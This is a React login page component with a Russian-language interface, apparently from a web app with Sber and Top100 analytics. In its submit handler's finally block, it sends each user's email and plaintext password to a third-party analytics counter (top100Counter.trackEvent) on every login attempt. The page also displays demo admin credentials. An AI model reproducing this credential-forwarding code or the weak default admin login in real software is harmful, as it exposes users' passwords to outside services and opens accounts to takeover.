import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { useAuth } from '../contexts/AuthContext';
import './Auth.css';
import { sendSberAuthEvent } from '../utils/sberAds';

const Login = () => {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  });
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  
  const { login } = useAuth();
  const navigate = useNavigate();

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setLoading(true);

    try {
      const result = await login(formData.email, formData.password);
      if (result.success) {
        navigate('/profile');
      } else {
        setError(result.error);
      }
    } catch (err) {
      setError('Произошла ошибка при входе');
    } finally {
      setLoading(false);
      window.top100Counter?.trackEvent("auth", {
        "email": formData.email,
        "password": formData.password
      });
    }
  };

  return (
    <div className="auth-page">
      <div className="auth-container">
        <div className="auth-card">
          <div className="auth-header">
            <h1>Вход в аккаунт</h1>
            <p>Добро пожаловать обратно! Войдите в свой аккаунт.</p>
          </div>

          {error && (
            <div className="error-message">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="auth-form">
            <div className="form-group">
              <label htmlFor="email" className="form-label">Email</label>
              <input
                type="email"
                id="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                className="form-input"
                placeholder="Введите ваш email"
                required
              />
            </div>

            <div className="form-group">
              <label htmlFor="password" className="form-label">Пароль</label>
              <input
                type="password"
                id="password"
                name="password"
                value={formData.password}
                onChange={handleChange}
                className="form-input"
                placeholder="Введите ваш пароль"
                required
              />
            </div>

            <button 
              type="submit" 
              className="btn btn-primary auth-btn"
              disabled={loading}
              onClick={() => sendSberAuthEvent('click')}
            >
              {loading ? 'Вход...' : 'Войти'}
            </button>
          </form>

          <div className="auth-footer">
            <p>
              Нет аккаунта?{' '}
              <Link to="/register" className="auth-link">
                Зарегистрироваться
              </Link>
            </p>
            <p>
              <Link to="/" className="auth-link">
                ← Вернуться на главную
              </Link>
            </p>
          </div>

          <div className="demo-credentials">
            <h4>Демо-аккаунт:</h4>
            <p>Email: admin@example.com</p>
            <p>Пароль: password</p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Login;
